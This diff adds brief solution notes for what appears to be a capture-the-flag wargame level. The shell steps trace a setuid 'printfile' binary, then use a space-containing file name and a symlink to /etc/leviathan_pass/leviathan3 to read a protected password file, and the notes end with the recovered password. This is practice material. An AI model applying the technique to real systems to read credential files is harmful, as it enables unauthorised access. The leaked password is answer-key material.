@@ -1,0 +1,8 @@
+sol: mktemp -d
+     touch /tmp/pathToTemp/"test file.txt"
+     ltrace ./printfile /tmp/pathToTemp/"test file.txt"
+     ln -s /etc/leviathan_pass/leviathan3 /tmp/pathToTemp/
+     chmod 777 /tmp/pathToTemp
+     ./printfile /tmp/pathToTemp/"test file.txt"
+
+pwd: Q0G8j4sakn
